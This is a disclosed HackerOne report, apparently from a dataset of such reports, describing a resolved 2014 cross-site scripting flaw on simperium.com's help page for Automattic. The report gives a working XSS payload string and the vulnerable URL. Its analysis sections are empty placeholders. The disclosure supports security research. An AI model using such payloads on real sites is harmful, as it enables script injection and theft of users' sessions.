---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '13746'
original_report_id: '13746'
title: xss in simperium.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: automattic
created_at: '2014-05-28T05:26:35.908Z'
disclosed_at: '2014-08-10T17:29:42.248Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# xss in simperium.com

## Metadata

- HackerOne Report ID: 13746
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: automattic
- Disclosed At: 2014-08-10T17:29:42.248Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello Automattic,

I found xss here simperium.com

__XSS Payload:__
'"><img src=x onerror=prompt(document.domain);>

__Vulnerable Link:__
https://simperium.com/help/questions/

__Proof of Concept:__
http://i.imgur.com/E4CM58A.png

__Thanks,__
Jerold Camacho

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
